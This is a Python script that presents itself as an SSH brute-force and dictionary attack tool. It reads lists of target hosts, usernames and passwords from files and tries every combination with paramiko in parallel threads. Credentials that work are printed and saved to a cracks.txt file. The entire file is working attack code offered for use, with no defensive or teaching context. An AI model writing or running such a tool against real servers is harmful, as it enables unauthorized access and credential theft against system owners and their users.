#SSH Multi Thread BruteForce/DictionaryAttack Tool

import sys
import paramiko
import termcolor
import threading
import time
import socket

if len(sys.argv) !=5:
    print("Usage: python3 sshsasori.py <Targets> <TargetPort> <Usernames> <Passwords> \n")
    sys.exit()

targets = str(sys.argv[1])
port = int(sys.argv[2])
usernames = str(sys.argv[3])
passwords = str(sys.argv[4])

flag = 0

def ssh_connect(target, username, password):
    global flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target, port=port, username=username, password=password, timeout=0.6)
        print(termcolor.colored((f"[+] Found : {target}:{username}:{password}"  ), "green"))
        flag = 1
    except paramiko.AuthenticationException:
        print(termcolor.colored((f"[-] Incorrect Login: {target}:{username}:{password}"), "red"))
    except socket.error:
        print(f"[-]Is {target} Offline?")
    ssh.close()


with open(targets, "r") as file:
    for line in file.readlines():
        target = line.strip()
        with open(passwords, "r") as file:
            for line in file.readlines():
                password = line.strip()
                with open(usernames, "r") as file:
                    for line in file.readlines():
                        if flag == 1:
                            cracks = open("cracks.txt", "w")
                            cracks.write(f"{target}:{username}:{password}")
                            cracks.close()
                            t.join()
                            exit()
                        username = line.strip()
                        t = threading.Thread(target=ssh_connect, args=(target,username,password,))
                        t.start()
                        time.sleep(0.5)
